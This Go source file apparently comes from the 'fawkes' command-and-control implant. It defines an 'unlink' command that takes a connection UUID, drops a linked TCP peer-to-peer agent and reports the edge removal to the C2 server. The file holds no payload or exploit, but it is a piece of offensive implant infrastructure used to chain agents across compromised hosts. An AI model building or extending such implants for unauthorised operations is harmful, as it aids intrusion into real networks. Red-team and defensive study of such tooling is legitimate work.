package commands

import (
	"encoding/json"
	"fmt"

	"fawkes/pkg/structs"
)

type UnlinkCommand struct{}

func (c *UnlinkCommand) Name() string {
	return "unlink"
}

func (c *UnlinkCommand) Description() string {
	return "Disconnect a linked TCP P2P agent"
}

type unlinkArgs struct {
	ConnectionID string `json:"connection_id"` // UUID of the linked agent to disconnect
}

func (c *UnlinkCommand) Execute(task structs.Task) structs.CommandResult {
	var args unlinkArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	if args.ConnectionID == "" {
		return structs.CommandResult{
			Output:    "connection_id is required (UUID of the linked agent)",
			Status:    "error",
			Completed: true,
		}
	}

	if tcpProfileInstance == nil {
		return structs.CommandResult{
			Output:    "TCP P2P not available — agent was not built with TCP profile support",
			Status:    "error",
			Completed: true,
		}
	}

	// Remove the child connection
	tcpProfileInstance.RemoveChildConnection(args.ConnectionID)

	// Send edge removal notification
	tcpProfileInstance.EdgeMessages <- structs.P2PConnectionMessage{
		Source:        tcpProfileInstance.CallbackUUID,
		Destination:   args.ConnectionID,
		Action:        "remove",
		C2ProfileName: "tcp",
	}

	shortUUID := args.ConnectionID
	if len(shortUUID) > 8 {
		shortUUID = shortUUID[:8]
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Successfully unlinked agent %s", shortUUID),
		Status:    "success",
		Completed: true,
	}
}
